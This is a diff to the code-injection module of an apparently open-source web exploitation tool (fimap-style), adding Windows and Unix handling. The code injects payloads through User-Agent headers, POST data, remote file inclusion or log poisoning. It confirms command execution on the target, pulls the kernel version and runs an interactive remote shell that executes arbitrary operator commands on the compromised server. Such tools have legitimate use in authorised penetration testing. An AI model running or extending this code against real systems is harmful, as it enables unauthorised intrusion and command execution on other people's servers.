@@ -62,6 +62,7 @@ class codeinjector(baseClass):
         postdata = vuln.getAttribute("postdata")
         ispost = vuln.getAttribute("ispost") == "1"
         language = vuln.getAttribute("language")
+        isUnix = vuln.getAttribute("os") == "unix"
         
         xml2config = self.config["XML2CONFIG"]
         langClass = xml2config.getAllLangSets()[language]
@@ -123,43 +124,47 @@ class codeinjector(baseClass):
         if (code.find(php_test_result) != -1):
             self._log("%s Injection works! Testing if execution works..."%(language), self.LOG_ALWAYS)
             php_inject_works = True
-            shellquiz, shellanswer = xml2config.generateShellQuiz()
+            shellquiz, shellanswer = xml2config.generateShellQuiz(isUnix)
             shell_test_code = shellquiz
             shell_test_result = shellanswer
             for item in langClass.getExecMethods():
                 try:
                     name = item.getName()
                     payload = None
-                    self._log("Testing execution thru '%s'..."%(name), self.LOG_INFO)
-                    testload = item.generatePayload(shell_test_code)
-                    if (mode.find("A") != -1):
-                        self.setUserAgent(testload)
-                        code = self.doPostRequest(url, postdata)
-                    elif (mode.find("P") != -1):
-                        if (postdata != ""):
-                            testload = "%s&%s" %(postdata, testload)
-                        code = self.doPostRequest(url, testload)
-                    elif (mode.find("R") != -1):
-                        code = self.executeRFI(url, postdata, suffix, testload)
-                    elif (mode.find("L") != -1):
-                        testload = self.convertUserloadToLogInjection(testload)
-                        testload = "data=" + base64.b64encode(testload)
-                        if (postdata != ""):
-                            testload = "%s&%s" %(postdata, testload)
-                        code = self.doPostRequest(url, testload)
-                    if code != None and code.find(shell_test_result) != -1:
-                        sys_inject_works = True
-                        working_shell = item
-                        self._log("Execution thru '%s' works!"%(name), self.LOG_INFO)
-                        if (kernel == None):
-                            self._log("Requesting kernel version...", self.LOG_DEBUG)
-                            uname_cmd = item.generatePayload(xml2config.getKernelCode())
-                            kernel = self.__doHaxRequest(url, postdata, mode, uname_cmd, langClass, suffix).strip()
-                            self._log("Kernel received: %s" %(kernel), self.LOG_DEBUG)
-                            domain.setAttribute("kernel", kernel)
-                            self.saveXML()
-
-                        break
+                    if (item.isUnix() and isUnix) or (item.isWindows() and not isUnix):
+                        self._log("Testing execution thru '%s'..."%(name), self.LOG_INFO)
+                        testload = item.generatePayload(shell_test_code)
+                        if (mode.find("A") != -1):
+                            self.setUserAgent(testload)
+                            code = self.doPostRequest(url, postdata)
+                        elif (mode.find("P") != -1):
+                            if (postdata != ""):
+                                testload = "%s&%s" %(postdata, testload)
+                            code = self.doPostRequest(url, testload)
+                        elif (mode.find("R") != -1):
+                            code = self.executeRFI(url, postdata, suffix, testload)
+                        elif (mode.find("L") != -1):
+                            testload = self.convertUserloadToLogInjection(testload)
+                            testload = "data=" + base64.b64encode(testload)
+                            if (postdata != ""):
+                                testload = "%s&%s" %(postdata, testload)
+                            code = self.doPostRequest(url, testload)
+                        if code != None and code.find(shell_test_result) != -1:
+                            sys_inject_works = True
+                            working_shell = item
+                            self._log("Execution thru '%s' works!"%(name), self.LOG_INFO)
+                            if (kernel == None):
+                                self._log("Requesting kernel version...", self.LOG_DEBUG)
+                                uname_cmd = item.generatePayload(xml2config.getKernelCode())
+                                kernel = self.__doHaxRequest(url, postdata, mode, uname_cmd, langClass, suffix).strip()
+                                self._log("Kernel received: %s" %(kernel), self.LOG_DEBUG)
+                                domain.setAttribute("kernel", kernel)
+                                self.saveXML()
+    
+                            break
+                    else:
+                        self._log("Skipping execution method '%s'..."%(name), self.LOG_DEBUG)
+                         
                 except KeyboardInterrupt:
                     self._log("Aborted by user.", self.LOG_WARN)
                     
@@ -172,7 +177,10 @@ class codeinjector(baseClass):
                     if (attack == "fimap_shell"):
                         cmd = ""
                         print "Please wait - Setting up shell (one request)..."
-                        pwd_cmd = item.generatePayload("pwd;whoami")
+                        #pwd_cmd = item.generatePayload("pwd;whoami")
+                        commands = (xml2config.getCurrentDirCode(isUnix), xml2config.getCurrentUserCode(isUnix))
+                        pwd_cmd = item.generatePayload(xml2config.concatCommands(commands, isUnix))
+                        print pwd_cmd
                         tmp = self.__doHaxRequest(url, postdata, mode, pwd_cmd, langClass, suffix).strip()
                         curdir = tmp.split("\n")[0].strip()
                         curusr = tmp.split("\n")[1].strip()
@@ -187,11 +195,14 @@ class codeinjector(baseClass):
                             if cmd == "q" or cmd == "quit": break
                             
                             if (cmd.strip() != ""):
-                                userload = item.generatePayload("cd '%s'; %s"%(curdir, cmd))
+                                commands = (xml2config.generateChangeDirectoryCommand(curdir, isUnix), cmd)
+                                cmds = xml2config.concatCommands(commands, isUnix)
+                                userload = item.generatePayload(cmds)
                                 code = self.__doHaxRequest(url, postdata, mode, userload, langClass, suffix)
                                 if (cmd.startswith("cd ")):
-                                    cmd = "cd '%s'; %s; pwd"%(curdir, cmd)
-                                    cmd = item.generatePayload(cmd)
+                                    commands = (xml2config.generateChangeDirectoryCommand(curdir, isUnix), cmd, xml2config.getCurrentDirCode(isUnix))
+                                    cmds = xml2config.concatCommands(commands, isUnix)
+                                    cmd = item.generatePayload(cmds)
                                     curdir = self.__doHaxRequest(url, postdata, mode, cmd, langClass, suffix).strip()
                                 print code.strip()
                         print "See ya dude!"
@@ -411,6 +422,9 @@ class codeinjector(baseClass):
                 textarr.append("[%d] %s"%(idx,k))
                 choose[idx] = v
                 idx = idx +1
+
+        #pluginman = self.config["PLUGINMANAGER"]
+        #plugin_attacks = pluginman.requestExploitAttacks(langClass, php, syst)
 
         textarr.append("[q] Quit")
         self.drawBox(header, textarr)
